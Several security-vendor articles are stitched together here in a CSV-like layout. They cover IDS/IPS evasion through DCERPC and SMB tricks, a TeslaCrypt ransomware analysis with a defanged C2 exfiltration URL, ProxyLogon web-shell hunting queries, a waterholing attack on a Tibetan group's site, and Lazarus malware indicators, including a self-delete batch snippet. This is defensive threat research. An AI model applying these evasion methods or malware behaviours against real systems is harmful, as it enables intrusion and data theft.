In the RPC calling mechanism there is one bind request which can contain one UUID and one context ID. The server uses context ID to identify the UUID. Generally, IPS/IDS signatures check the UUID of vulnerable functions in the incoming stream and then parse the argument for malicious content. However, it is also possible for the server to receive multiple UUIDs and multiple context IDs for every single bind request. This is called multiple UUID bind and is a valid request. IPS rules that check for only one UUID and one context per bind request will allow the traffic to pass through, yet the multiple bind part of the UUID may be associated with a vulnerable function. The server will use the context ID and may make a call to the vulnerable function. To prevent multiple bind evasion, an IPS device should parse the bind request. If there are multiple binds and multiple context IDs, then it should keep track of vulnerable UUIDs and corresponding context IDs. If there is a vulnerable function call using that context ID, the IPS rules should monitor the functions for malicious content.",0.021452124727533883
"SMB CreateAndX path names
The path name \\\\\\\\\*SMBSOMESERVICE\C$ is treated in the same way as \\*SMBSOMESERVICE\C$. So, if a DCERPC signature is trying to block the path name, it can be evaded by adding \\\\\\\\. In order to prevent evasion, the IPS device must be able to check for the presence of extra ‘\’s in the path name.",0.01282921799922998
"Bind to one UUID then alter context
A normal RPC call with a bind request contains a UUID with a context ID. The function opnum is called using that context ID. An opnum is an operation number or numeric identifier that is used to identify a specific RPC method or a method in an interface [14]. To open a new context for a different UUID over the same connection, the alter context DCERPC command [alter_ctx()] can be used. The alter context request leaves the previous context ‘on hold’. Alter context is required since, after binding to a specific interface, binding to another one over the same connection using bind () is not possible. However, the signature, which checks context ID, can be evaded by using alter_ctx().
In the first step of evasion, the normal UUID is associated with a context ID. The IDS or the signatures – which are checking the traffic on the basis of context ID – allow the traffic as normal traffic. Then an alternate context call is used to link the vulnerable UUID with the original context ID. This is followed by a call to a vulnerable function containing the vulnerable interface (UUID), which is made by using the context ID. Since the detection device tracks the context ID associated with the non-vulnerable UUID, protection can be evaded by using alter context.",0.017011496750410027
"Prepend an ObjectID
In a normal RPC call, the arguments or the stub data generally appear after the opnum. However, it is possible for the opnum to be followed by the UUID, which is followed by the stub data. A detection device should be able to parse both scenarios. One of the methods to check such scenarios is to look up the value of the eighth bit in the packet flag. If the value of the eighth bit is set, the detection device should skip 16 bytes and check the start of the stub data.",0.01060907831685054
"Bind with authentication field
The Ctx field appears at the end of a normal bind request. The RPC protocol also makes provision for authentication of the client to the server, and the authentication fields (such as auth type, auth level) can appear after the Num Ctx. These fields will not be present in the normal bind request. If a detection device treats the extra bytes as an extension of the context ID it will generate an error. This can be avoided by checking for the value of the auth length in the header. A non-zero value denotes the presence of extra bytes in the header.",0.010689038181622923
"One-packet UDP function call
The RPC handshake consists of a 20-byte secret number. This can be avoided by setting the idempotent flag in RPCv4 requests. If the flag is set, the 20-byte secret number can be avoided, also making it feasible to guess the request source. Since the flag allows the sending of the two requests as a single request, and if the IPS rules are dependent upon the handshake process, a signature can be evaded by setting the flag.",0.014594754012130173
"Chaining SMB commands
SMB commands ending with ‘ANDX’ can be chained. This leads to the sending, for example, of SMB_COM_TREE_CONNECT_ANDX + SMB_COM_OPEN_ANDX + SMB_COM_READ in a single SMB request. If a detection device checks for one SMB command in an SMB header, then it can be evaded by sending multiple chained commands. To prevent this, the detection device must check the value of the ‘AndXOffset’ field – if the value of this field is zero, then there will not be any more commands.",0.01210968615779584
"Out of order chaining
The AndXOffset field stores the next SMB command, and every AndX command has the offset in the packet to the following command. Hence the physical order does not have to match the logical order and an arranged packet can be built. The first command in the chain will be the first command in the packet. An intrusion detection device must have the ability to parse an SMB header with out-of-sequence command chaining; otherwise it will fail to calculate the number of SMB commands in the header.",0.013573060970699213
"Application-specific evasion in SMB
It does not matter to Windows SMB implementation if there is more data than needed in a command. The AndXoffset contains the offset of the next command and it is possible to insert random data between the commands. A detection device must be able to parse it correctly.",0.008243858807649218
"Conclusion
There are a variety of methods that attackers can use to thwart IDS/IPS systems. We have discussed several of these. To recap, web servers support various encodings such as hex, double percentage, double nibble hex, second nibble, Microsoft %U, and mismatch encoding. Detection devices should be able to decipher these encodings. To prevent evasion in SMTP, it is recommended that the IDS/IPS implement a bidirectional protocol decoder – that is, the decoder should be able to parse both the client and the server messages correctly. MIME provides an option of various encodings, and the detection device should be able to decode the traffic correctly. MSRPCH is an evasion vector for DCOM-related vulnerabilities. A detection device should also be able to reassemble the packets and inspect them; otherwise an attack can be spread over packets. The RPC protocol is also prone to evasion. RPC provides various options of sending commands such as Unicode, non-Unicode, big-endian and little-endian format. A detection device also should be able to decipher these formats.
In this article we have looked at some of the commonly occurring evasion methods. For effective protection it is vital for intrusion prevention and detection systems to have anti-evasion measures.",0.017753848956314378
"Acknowledgements
The authors would like to express their gratitude and thanks to Jimmy Kuo for his feedback on the article and to Patrick Nolan.",0.01643385384974183
"Bibliography
[1] http://tools.ietf.org/search/rfc5321.
[2] http://www.ietf.org/rfc/rfc1939.txt.
[3] http://tools.ietf.org/html/rfc3501.
[4] http://www.w3.org/Protocols/HTTP/1.1/rfc2616.pdf.
[5] http://www.faqs.org/rfcs/rfc2047.html.
[6] http://www.faqs.org/rfcs/rfc2045.html.
[7] http://www.ietf.org/rfc/rfc1831.txt.
[8] http://msdn.microsoft.com/en-us/library/cc243950(PROT.13).aspx.
[9] http://msdn.microsoft.com/en-us/library/cc201989(PROT.10).aspx.
[10] http://www.ietf.org/rfc/rfc1945.txt.
[11] http://www.faqs.org/rfcs/rfc2822.html.
[12] http://www.faqs.org/rfcs/rfc822.html.
[13] http://msdn.microsoft.com/en-us/library/dd304523(PROT.13).aspx.
[14] http://msdn.microsoft.com/en-us/library/cc232137(PROT.10).aspx.
[15] A look at whisker’s anti-IDS tactics. http://www.wiretrip.net/rfp/txt/whiskerids.html.
[16] Multiple vendor MIME field multiple occurrence issue. http://research.corsaire.com/advisories/c030804-002.txt.
[17] Multiple vendor MIME field whitespace issue. http://research.corsaire.com/advisories/c030804-003.txt.
[18] Multiple vendor MIME field quoting issue. http://research.corsaire.com/advisories/c030804-004.txt.
[19] Multiple vendor MIME Content-Transfer-Encoding mechanism issue. http://research.corsaire.com/advisories/c030804-005.txt.
[20] Multiple vendor MIME RFC822 comment issue. http://research.corsaire.com/advisories/c030804-009.txt.
[21] Vulnerability Analysis and Defense for the Internet, Springer Publications.
[22] Caswell, B.; Moore, H.D. Thermoptic Camouflage Total IDS Evasions. http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Caswell.pdf.
[23] Legiment Techniques of IPS/IPS evasions. http://null.co.in/papers/legiment_ajit.pdf.
[24] HTTP IDS Evasion Revisited. http://docs.idsresearch.org/http_ids_evasions.pdf.
",0.02058466911863166
The current state of ransomware: TeslaCrypt,0.009800595381966315
"Written by
Editor",0.007990427730288352
"January 06, 2016",0.009560728253368622
Enduser Network Security Tips Threat Research Cryptolocker Cryptowall malware Ransomware TeslaCrypt,0.010781358094274496
"So far, our series on the current state of ransomware has taken an in-depth look at three ransomware families: CryptoWall, TorrentLocker and CTB-Locker. Today we’ll talk about the variant known as TeslaCrypt.
TeslaCrypt (a.k.a. EccKrypt) is one of the most recent ransomware variants we’ve seen widely that encrypts certain user files and demands a ransom be paid to decrypt the files. Similar to other variants, it uses an AES symmetric algorithm to encrypt files.
TeslaCrypt is distributed widely via the Angler exploit kit and a few other known exploit kits. Using Angler, it exploits Adobe Flash (CVE-2015-0311) and, once successfully exploited, it downloads TeslaCrypt as a payload.",0.015633775335083144
"Angler is exploited via an injected iframe from the compromised website. It redirects to a landing page that is highly obfuscated, contains anti-vm techniques, and performs checks for the presence of antivirus software or malware analysis tools like fiddler, etc.
For each obfuscation code, it contains de-obfuscation script in the same web page.
Figure 1 shows the snippet of the obfuscated script in the landing page.",0.01178841212375803
And Figure 2 is the de-obfuscated script that checks for the presence of various antivirus software.,0.012891791130915875
"Once all the conditions are met, the decrypted URLs download the Flash exploit which, in turn, downloads the ransomware payload in the temp folder.
It also uses Xtea algorithm to decode the encoded payload. Apart from the Flash exploit, we have also seen exploits related to Silverlight and Internet Explorer.
Angler doesn’t use the file-less payload technique – rather it writes the payload ransomware into the disk.
Execution
The TeslaCrypt binary that we have seen so far is usually compiled using Visual C++. The ransomware code is then encoded/compressed within the binary itself.
After decrypting its code in memory, TeslaCrypt overwrites the decrypted MZ binary onto itself.
The decrypted memory MZ binary is also compiled using Visual C++.
It runs multiple threads for different purposes.",0.016453954538028448
"File encryption thread.
Monitors the following process names and terminates them.",0.0126751428492905
"exe
msconfig
regedit
procexp
taskmgr",0.009454733155185968
"Contacts the command and control server and sends a few specific details such as the sha-256 value of the key generated from key.dat, Bitcoin address, number of files encrypted, user IP address, etc., as base64 encoded parameter.
Deletes all backup volume shadow files using vssadmin.exe.",0.014847492769468507
"Encryption
TeslaCrypt creates key.dat under %appdata% where it also drops a copy of itself and creates log.html to store the list of files encrypted. It encrypts user-specific files by enumerating all directories including network drives.
Figure 3 shows the lists of file extensions that will be encrypted, including some related to dozens of games, including saved games, configurations, maps and replays.",0.01352748628895073
"It uses AES cipher for encrypting files and stores sha-256 values of the different keys in key.dat along with a Bitcoin payment key. The key.dat structure varies between different variants that we have seen.
It also stores other key information which is not known at the moment.
Also, irrespective of a successful connection to the command and control server, the dropper file still encrypts files. After successful encryption, it shows the GUI window giving details about the payment option.
It also uses some OpenSSL libraries, probably for generating Bitcoin addresses.
After encrypting files, it renames them. Below are some of the extension names it uses for the variants we have seen so far:",0.010827996012531926
".encrypted
.ecc
.ezz
.exx",0.010724588868456286
"Network Communication
After encrypting a specific list of files, it connects to the command and control server via the TOR network using different TOR proxy servers along with specific details as base-64 encoded parameter.
Encoded URI pattern:
hxxp://dpckd2ftmf7lelsa.afnwdsy4j32.com/tsdfewr2.php?U3ViamVjdD1DcnlwdGVkJmtleT01MzE3QzlFOENGMDMwOUZFODgx
MTBGMTBGQzFCMEUwNzk1MDIzNDlEQTg5MjA3QzJDQjZENDUyOUM
2QzIzQUE5JmFkZHI9MUQyUHF5M0g5c280Q0JheXFkTWo0V0N1cmNSek
QxUXJBYSZmaWxlcz05MCZzaXplPTE1MSZ2ZXJzaW9uPTAuMy43YiZkYXR
lPTE0MzA4MzI1ODgmT1M9MjYwMCZJRD03MiZzdWJpZD0wJmdhdGU9Rz
AmaXNfYWRtaW49MSZpc182ND0wJmlwPTU0LjcyLjIyNS4yNDMmZXhlX3
R5cGU9MQ==
Decoded URI pattern:
hxxp://dpckd2ftmf7lelsa.afnwdsy4j32.com/tsdfewr2.php?Subject=Crypted&key=1BF7BEF096B61D09F6F59B83FC5A4B5AD18627
E65BA0E018174B4C500038ED80&addr=1EqKCDymcbeBKVjGSq9D8pavGF
yrjCyvz7&files=2143&size=773&version=0.3.0&date=1425073689
&OS=2600&ID=20&subid=0&gate=G0&is_admin=1&is_64=0&ip=193.128.108.238
It then fetches the user’s IP address by contacting “ipinfo.io”.
Ransom Payment
After encrypting the list of files, it launches a GUI window to show the user that their files have been encrypted and offers them a payment option to get the decryption key as shown in Figure 4.",0.011837925433502372
"It also gives the option to decrypt a single file for free, as shown in Figure 5, in order to convince the user that they will get back all their files once they pay.",0.00980534692458368
"TeslaCrypt gives the option to use Bitcoin, PaySafeCard or Ukash for payment. We haven’t yet seen evidence that it can target any non-English users by using other languages in their ransom GUI window.
Statistics
Among all the variants analyzed in this paper, next to CryptoWall, TeslaCrypt has the most number of infections seen widely across all countries.",0.012466528376757102
"Protection:
Sophos protects its customers from TeslaCrypt using the following detections: HPmal/EccKrpt-A, Troj/TeslaCrypt-*, Mal/ TeslaCrypt-*, Troj/Ransom-*.
Having Sophos HIPS technology enabled is strongly recommended to block ransomware proactively.
If you suspect you’ve been compromised by ransomware, you can remove the malware using our Free Virus Removal Tool. Sadly, there’s not much you can do to get your files back except to pay the ransom – the encryption is too strong to crack.
Apart from having your antivirus up to date, there are additional system changes to help prevent or disarm ransomware infections that a user can apply.
1. Back up your files.
The best way to ensure you do not lose your files to ransomware is to back them up regularly. Storing your backup separately is also key – as discussed, some ransomware variants delete Windows shadow copies of files as a further tactic to prevent your recovery, so you need to store your backup offline.
2. Apply windows and other software updates regularly.
Keep your system and applications up to date. This gives you the best chance to avoid your system being exploited using drive-by download attacks and software (particularly Adobe Flash, Microsoft Silverlight, Web Browser, etc.) vulnerabilities which are known for installing ransomware.
3. Avoid clicking untrusted email links or opening unsolicited email attachments.
Most ransomware arrives via spam email either by clicking the links or as attachments. Having a good email anti-virus scanner would also proactively block compromised or malicious website links or binary attachments that lead to ransomware.
4. Disable ActiveX content in Microsoft Office applications such as Word, Excel, etc.
We’ve seen many malicious documents that contain macros which can further download ransomware silently in the background.
5. Install a firewall, block Tor and I2P, and restrict to specific ports.
Preventing the malware from reaching its call-home server via the network can disarm an active ransomware variant. As such, blocking connections to I2P or Tor servers via a firewall is an effective measure.
6. Disable remote desktop connections.
Disable remote desktop connections if they are not required in your environment, so that malicious authors cannot access your machine remotely.
7. Block binaries running from %APPDATA% and %TEMP% paths.
Most of the ransomware files are dropped and executed from these locations, so blocking execution would prevent the ransomware from running.",0.0200300079803174
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"7
",0.01923895472649928
MTR in Real-Time: Exchange ProxyLogon Edition,0.009478207508115344
"Written by
Michael Heller",0.008758043479553224
"March 17, 2021",0.009878125323738218
Security Operations cryptominer DearCry Exchange Server Exchange vulnerability Hafnium Microsoft Exchange ProxyLogon Ransomware Web shells,0.00847682004104866
"The recently reported collection of Microsoft Exchange Server zero-day vulnerabilities has rocked the infosec world, impacting tens of thousands of organizations around the world, with some estimates exceeding 100,000 and growing by the day.
The exploitations seen in the wild were first attributed to a nation state actor dubbed Hafnium, but the vulnerabilities and attacks have colloquially become known as “ProxyLogon” in reference to the main vulnerability of the zero-days involved.
The common form of ProxyLogon attacks seen so far includes vulnerable Exchange Servers being exploited and web shells dropped on those servers. However, as the news of the zero-days spread, opportunistic malicious actors have begun scanning for those web shells because finding one can be a shortcut to deploying ransomware or cryptominers, or launching other attacks, all without needing to go through the trouble of finding a way into a network.
“These web shells are dangerous because they can be activated at any time after they’ve been installed, even on a subsequently patched system,” said Mat Gangwer senior director of Sophos Managed Threat Response (MTR). “Even more concerning is that anybody can come along and use them. It doesn’t just have to be the original attacker who put it there. It might initially have been a nation-state adversary, but it’s not anymore.”
Although MTR customers have not seen attacks progress to the level of ransomware or cryptominers, Microsoft has reported a new ransomware threat – DearCry – targeting vulnerable Exchange servers and the web shells left behind after successful Exchange attacks.
Patch first
While the web shells placed on victim devices could be the source of any further attacks that occur, the first step is still to ensure all Exchange Servers are patched against the original zero-day vulnerabilities. There are four zero-day vulnerabilities that must be patched: CVE-2021-26855, also known as “ProxyLogon,” is a server-side request forgery flaw that can be chained together with CVE-2021-27065, a post-authentication arbitrary file write bug, for an attacker to achieve remote code execution. Additionally, CVE-2021-26857 and CVE-2021-26858 have been used in Exchange server attacks.
Microsoft released out-of-band patches for Exchange Server 2013, 2016, and 2019, as well as a defense-in-depth update for Exchange Server 2010 because that version is only vulnerable to CVE-2021-26857.
Microsoft said Exchange Server 2003 and 2007 are not vulnerable.
If an organization cannot patch immediately, Microsoft released an Exchange Mitigations script that can temporarily provide protection until full patches can be applied.
Investigate to determine next steps
Once the patches have been applied, the next step is to look for web shells, any activity that might have been performed by those web shells, and when that activity occurred.
Microsoft has multiple tools and scripts available for customers to help determine if they have been impacted and how. There is the ProxyLogon Powershell script that will check Exchange and IIS logs to determine if an exploit was attempted, although it will not provide information on further impact.
Microsoft released an update to its Safety Scanner tool (MSERT) so it can be used to scan for and remove web shells on potentially affected servers.
For those susceptible to ProxyLogon attacks, Sophos provides a number of protections against variants of observed malicious web shells. Intercept X will provide alerts if web shell activity is detected and manual queries can be run in Sophos EDR to check for web shells. However, “just to be safe” Gangwer suggests Sophos customers use the MSERT tool to double check for web shells. “You owe it to yourself to do that,” he said.
/* Query for known web shell names */
SELECT
datetime(btime,'unixepoch') AS created_time,
filename,
directory,
size AS fileSize,
datetime(atime, 'unixepoch') AS access_time,
datetime(mtime, 'unixepoch') AS modified_time
FROM file
WHERE
(path LIKE 'C:\inetpub\wwwroot\aspnet_client\%' OR path LIKE 'C:\inetpub\wwwroot\aspnet_client\system_web\%' OR path LIKE 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\%')
AND filename IN ('web.aspx','help.aspx','document.aspx','errorEE.aspx','errorEEE.aspx','errorEW.aspx','errorFF.aspx','web.aspx','healthcheck.aspx','aspnet_www.aspx','aspnet_client.aspx','xx.aspx','shell.aspx','aspnet_iisstart.aspx','one.aspx','errorcheck.aspx','t.aspx','discover.aspx','aspnettest.aspx','error.aspx','RedirSuiteServerProxy.aspx','shellex.aspx','supp0rt.aspx','HttpProxy.aspx','system_web.aspx','OutlookEN.aspx','TimeoutLogout.aspx','Logout.aspx','OutlookJP.aspx','MultiUp.aspx','OutlookRU.aspx');",0.016142158293214415
"/* Query for web shells with randomized 8 character names */
SELECT
datetime(btime,'unixepoch') AS created_time,
regex_match(filename, '[0-9a-zA-Z]{8}.aspx', 0) AS filename,
directory,
size AS fileSize,
datetime(atime, 'unixepoch') AS access_time,
datetime(mtime, 'unixepoch') AS modified_time
FROM file
WHERE (path LIKE 'C:\inetpub\wwwroot\aspnet_client\%' OR path LIKE 'C:\inetpub\wwwroot\aspnet_client\system_web\%' OR path LIKE 'C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\%');
These queries are based on currently known intelligence, and will be kept up to date on sophos.com/hafnium
Dealing with a known attack
Once these checks have been performed, the MTR team has noticed organizations fall into three general buckets:",0.01211684156091486
"Those who do not find evidence of web shells. In this case, if the customer has patched all potentially vulnerable Exchange Servers, it presents less risk, but each organization should do their due diligence based on their risk thresholds.
Those who found web shells, but all malicious activity occurred towards the end of February or later. In this case, it is likely the malicious actor was an opportunist taking advantage of the Hafnium news and the web shells left on victim devices. In this instance determining what commands were issued through the web shell is the critical next step to determining impact.
Those who found web shells with malicious activity occurring before the end of February. In this case, the organization may be dealing with a targeted attack and should treat it accordingly by enacting their incident response process.",0.009981526353347925
"Once an organization determines they have been impacted by a ProxyLogon attack, the next step is to determine when the attack occurred and what malicious activity can be seen. In some cases, organizations may have been impacted, had a web shell dropped, and no other malicious activity, but other organizations may have been hit with targeted attacks, cryptominers, or even ransomware like DearCry.
Another script released by Microsoft could help with determining what impact an attacker had. The CompareExchangeHashes.ps1 script will go through file-by-file to compare the known good hashes of baseline Exchange directories to what is on an organization’s server to establish the extent of impact. This script will result in more false positives, according to Gangwer, but it would be “a more comprehensive way of knowing if there’s something going on and organizations will be aware they are being exhaustive in their investigation.”
Gangwer said that in many cases MTR has found web shells that didn’t perform any activity or where such activity was general recon, but attacks could be far more involved.
“If you see web shells and review the commands to find further credential access, lateral movement, or data exfiltration, you should immediately initiate your incident response plan,” Gangwer said. “Think about Rapid Response or some other incident response service because you need a thorough investigation at that point.”",0.01584004055622834
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
The Tibetan Alliance of Chicago hit by cyber waterholing attack,0.009144031873471459
Websense Security Labs™ ThreatSeeker® Intelligence Cloud has detected that the website of the Tibetan Alliance of Chicago has been compromised to serve malicious code.,0.012870246339131364
"In the last two days, the BBC website reported news about a waterholing attack against the Central Tibetan Administration website. Over the last two years, attacks like these have targetted pro-Tibet websites and other human rights organizations around the world. A waterholing attack is one that targets users of specific websites with the aim to install malware on their systems (usually using a backdoor approach) to collect documents, email contacts, social contacts, and passwords. The frequency of these attacks prompted Websense Security Labs to check our collective threat intelligence for any other websites that are considered pro-Tibet to see if they are affected by this kind of attack.",0.014107213152694587
In this blog we're going to analyze the Tibetan Alliance of Chicago website and illustrate how waterholing attacks are conducted.,0.01583250516298096
"One of the trends with targeted attacks in the last few years is that any installed malware binaries connect to dynamic DNS websites. One of the most interesting aspects of this specific attack is that a successful exploit downloads a binary that connects to a small Dynamic DNS service offered by none other than a German-based security appliances and services company, which reaffirms the notion that perpetrators pick and choose the parts of their attack infrastructure.",0.012148368269136234
"Although the website does not have a high Alexa rank, we thought it was worth consideration, because our analysis concluded that it wasn't a scattered attack, but a targeted injection to infect the users of that website. The website has been injected with two malicious iFrames as shown below:",0.011232708498158939
"We started to investigate the content of these two links above. The first (hxxp://78.129.252.195/images/Adobe/index.html) contains another iFrame that leads to a Firefox plugin named ""Adobe Flash Player.xpi,"" although at the time of the analysis, the plugin wasn't available:",0.011618702255037472
"When we used Threatseeker to search for other instances of ""Adobe Flash Player xpi,"" we detected other malicious websites, so we deduced that the aim of this iFrame was to try to install a malicious plugin using social engineering techniques. The second link (hxxp://78.129.252.195/index.html) caught our attention, because it seems to be malicious code exploiting the vulnerability CVE-2012-4969 as shown below:",0.010989517793313808
The code highlighted above shows another iframe that leads to hxxp://78.129.252.195/yRrztX.html with the following content:,0.008601984154300801
"From this, we could see the code used to trigger the Internet Explorer vulnerability addressed as CVE-2012-4969 and spotted in other targeted attacks by a security researcher here in September 2012. The code within the page ""index.html"" uses the ""heap spray"" mechanism to run shellcode if the exploiting attempt succeeds. The following is the snippet of code that has been assigned the shellcode:",0.007422182442775704
"Once the shellcode is executed, it downloads and runs a malicious file on the compromised system. The shellcode appears to be using the Windows default user-agent 'wininet' to retrieve the malicious file, which in itself can be considered suspicious, because we don't normally see many legitimate HTTP requests that use this agent. We do see this user-agent being used by legitimate software, but it's not predominant.",0.010113511498445749
Following is the Fiddler's session where you can see the binary file that was downloaded:,0.0075008104116488505
"Analyzing the dynamic behavior of the malicious executable, you can detect a first call to the command-and-control point at mail.firewall-gateway.com located in the United Kingdom:",0.008249693627565335
"We conducted a quick investigation about the domain ""firewall-gateway.com,"" and it appears to be mantained by the German service provider, Securepoint, that specializes in provisioning secure VPN endpoints and other kinds of network services offerings. This is what we saw from the WHOIS record:",0.013435774740929274
:,0.007193087610167348
"In one of Securepoint's support forums, the announcement of the availability of a dynamic DNS service is still shown. The service appears to be available at this address. We believe it's an attempt to remain covert, because it is not by chance that the perpetrators chose their command-and-control point to be reached through a dynamic DNS service associated with a security company.",0.010162352238903938
"The detection rate of the binary file seems very low as reported by Virustotal. From a brief static analysis of the malicious binary file, you can detect a list of strings used to check the presences of Antivirus on the impacted system:",0.011407419738742042
"The binary file has a low AV rate detection rate, as reported by this Virustotal report.",0.013369189487768995
"In this blog we gave a brief example of what seems to be a waterholing attack that is aimed for a specific crowd, in this case, pro-Tibet users. We believe that the complexity of such attacks lies in direct relation to the security measures that are employed by the potential targets, in this case the attack isn't that complex but probably just enough to fulfill its ultimate purpose.",0.013246940724049638
"Websense customers are protected from injected websites and the different stages of this threat with our Advanced Classification Engine - ACE.
",0.01135231284699123
VB2018 paper: Since the hacking of Sony Pictures,0.010368283478433438
Minseok (Jacky) Cha,0.010569799736857122
"AhnLab, South Korea",0.009714622420196495
Copyright © 2018 Virus Bulletin,0.009633121006031975
"Table of contents
Abstract Overview Sony Pictures hack Characteristics of malware Operation Mystery Dot (2011–2014) Dropper (2011) Redobot (KorDllbot) Early version of Escad (2014) Operation Red Dot (2014–2015) Changes in malware Operation Big Pond (2015–2017) Operation Coin Rush (2017–2018) Suspicious activities Navepry Lazarus connections Conclusion References",0.019654486729134057
Abstract,0.009485057568311417
"The Sony Pictures hack occurred in 2014, and the news that the company's internal data had been destroyed and confidential data had been leaked was publicized worldwide. When Korean malware researchers first heard about the attack, they recalled the attacks against Korean banks and media companies between 2011 and 2013, but they didn't anticipate a connection with this attack. When more information on the malware was released, it came as quite a surprise to find that it contained similar code to malware that had already been found in Korea.",0.014298140399859438
"The Lazarus Group, which includes Red Dot and Labyrinth Chollima, became well known to the press and the security community outside of Korea because of the Sony Pictures hack. Malicious code that is similar to the code used in the Sony Pictures hack is still being used in targeted attacks on Korean companies and institutions. In 2015, a zero-day exploit targeted the participants of the Seoul ADEX 2015 conference using a Hangul vulnerability, and in 2016, a Windows zero-day vulnerability was used to hack various ICT companies and web-hosting providers. The group is also suspected of attacking a cryptocurrency exchange.",0.012681387895880136
"In this paper, I will describe various attacks in Korea which occurred after the Sony incident and are suspected to be the work of the Lazarus Group. I will also analyse and discuss the changes seen in the malware code.",0.018899152664837215
Overview,0.008067833318706974
"In November 2014, Sony Pictures Entertainment was the target of a cyber attack that resulted in the destruction of its system data and the release of internal emails and upcoming movies. When detailed information about the incident was revealed, malware analysts in South Korea discovered a strong correlation between this malware and the malware that had been used in recent cyber attacks in South Korea. It was later announced by the US government that the group behind the Sony attack was linked to the Lazarus Group, which is mainly active in South Korea.",0.016845357327515575
"The governmental institutions of Korea have been under continuous cyber attack from unidentified attackers since 2007. There is a connection between these attackers and the group behind the attack on Sony Pictures. Lazarus Group, otherwise known as Hidden Cobra, is also known to have been behind the hacking of the Bangladesh Central Bank in 2016 [1] and a series of hacking incidents targeting cryptocurrencies and casinos in 2017. Meanwhile, the Bluenoroff group, a subgroup of the Lazarus Group, is more focused on attacking financial institutions and cryptocurrency exchanges. Another subgroup, Andariel, is active only in South Korea and seeks to perform various attacks that focus on stealing confidential data from the military and defence industries. Andariel was responsible for causing server errors in the 3.20 (DarkSeoul) attack on 20 March 2013, and since the second half of 2016 it has been more focused on attacking the financial industry. The activities of the Lazarus Group have been reported not only in Korea but in a number of countries [2, 3].",0.017048753486595625
"This report provides insights into the malware used in the Sony Pictures hacking incident and the changes seen in the malware used in attacks in Korea before and after the incident. Note that this report is based on the publicly released information and not on the results of an AhnLab investigation. As the group has a long history of attacks and malware, the report focuses specifically on the activities of Lazarus in relation to the Sony Pictures hack.",0.01752202599893815
Sony Pictures hack,0.00978711062477311
"On 24 November 2014, Sony Pictures was attacked by a hacker group which identified itself as the Guardians of Peace (GOP). The attack destroyed internal system data and leaked a slew of confidential data including internal emails and yet to be released films. Sony Pictures was in the process of making a film that depicts the assassination of Kim Jong-eun, so the possibility of the attack having a link to North Korea was speculated from early on [4]. Moreover, shortly afterwards, a British TV company that was engaged in making a drama about a British nuclear scientist on a covert mission to North Korea was hacked by North Korea and production of the drama was cancelled [5]. The US government released their findings on the malware used in the Sony hack in December 2014 through the FBI and US-CERT [6]. In February 2016, Novetta published the 'Operation Blockbuster' [7] report and, in May 2016, Blue Coat published a report entitled 'From Seoul To Sony' [8] on their findings. The findings show that the attack methods of the malware used in the Sony Pictures hack were similar to those used by the Lazarus Group, so it is beyond speculation that North Korea was behind the attack.",0.016629982230495166
Characteristics of malware,0.007810543985382279
"The released results contained information on the backdoors, known as Escad, used in the attack.",0.0077149564912867286
SHA256,0.009626279759872403
MD5,0.009411548072560616
eff542ac8e37db48821cb4e5a7d95c044fff27557763de3a891b40ebeb52cc55,0.01049157188858485
6467c6df4ba4526c7f7a7bc950bd47eb,0.009063352235324618
4c2efe2f1253b94f16a1cab032f36c7883e4f6c8d9fc17d0ee553b5afb16330c,0.010680684697343179
e904bf93403c0fb08b9683a9e858c73e,0.009239514229221535
The backdoors have the following features in common:,0.007781472021602065
"The IP address of the C&C server is not obfuscated (see
Figure 1
).",0.008988020140378361
"The loaded DLL file strings are encrypted using the XOR 0xA7 key and the API has an uncommon cmd.exe method which includes dots (.) in strings (see
Figure 2
).",0.010499863658273711
The backdoor initialization code sets up the C&C server IP address to access the server. It then receives commands from the server to carry out its backdoor functions.,0.010684963779550971
The backdoors also include fake code for SSL that appear to make legitimate SSL communications.,0.015301329296316335
Figure 1: IP address of the C&C server.,0.013938010763765107
Figure 2: Specific strings of the backdoor known as Escad.,0.011038022946597725
Operation Mystery Dot (2011–2014),0.017596363335249166
"So, when was the first appearance of this malware? AhnLab found similar malware being used in attacks as early as April 2011. This malware not only includes dots in the API address like the backdoors used in the Sony attack, but some variants even use the same key value (0xA7) for decryption.",0.01220474760081347
Dropper (2011),0.015404960939413681
SHA256,0.009626279759872403
MD5,0.009411548072560616
37be47f8df3c94d365d693855d1af5ac8b94eedd1b3b3122586a6d48611230bb,0.009830376165014365
49ace8a624dd22f3110f041a324d1646,0.008531894113357419
8c2b014f0ad27a3a325f15c916cdc9f5963ad4276e9fc928817387c0e5dc62bd,0.009991565785431256
d306065bab5b742f669bb1efcebaed3a,0.008617763483659169
"The droppers discovered in April 2011 include dots and perform XOR encryption with the 0xA7 key, identical to the malware used in the Sony Pictures hack, to decrypt passwords. These droppers have the unique characteristic of the string 'BMZA'; text strings containing 'BM' are also found in other malware from the Lazarus Group.",0.012952298143034557
The self-delete batch file is the same as that of the Redobot backdoor:,0.005934315106200794
":L1
del ""C:\work\RP0.exe""
if exist ""_RP0.exe"" goto L1
del ""C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp\msvcrt.bat""",0.012821181502159829
Redobot (KorDllbot),0.017050678766020066
"Redobot is a backdoor that was known to be in the wild between April 2011 and April 2014. This backdoor is in a DLL file format, uses API addresses that are obfuscated with dots, and contains unique text strings such as '%sd.e%sc %s 2>%s' and '%sd.e%sc %s > %s 2>&1', as shown in Figure 3.",0.011558090412911004
Figure 3. Unique text string of Redobot.,0.015295098344249802
Some malware samples use dots as well as dashes (-) and angle brackets (<) for API obfuscation. But there are also variations without any obfuscation (b7f2595dd62d1174ce6e5ddf43bf2b42f7001c7a4ec3c4cbe3359e30c674ed83_0092f2d519739f8978cb940af0d7cca6).,0.013852982528784419
Droppers that generate these DLL files were also discovered.,0.011124247116221953
SHA256,0.009626279759872403
MD5,0.009411548072560616
b039383a19e3da74a5a631dfe4e505020a5c5799578187e4ccc016c22872b246,0.009967091222638835
0fe856d398c877ba0cb7019e983b5c84,0.008878465485472331
218ee208323dc38ebc7f63dba73fac5541b53d7ce1858131fa3bfd434003091d,0.010290799956292784
cffb5d8fc73d9e7cc5860bd6f3177b1c,0.00913956463137
58b7cd75f61f6e8d3f270582a06808ce7ea77792537a102c36daf68260b43bfc,0.01015113951036306
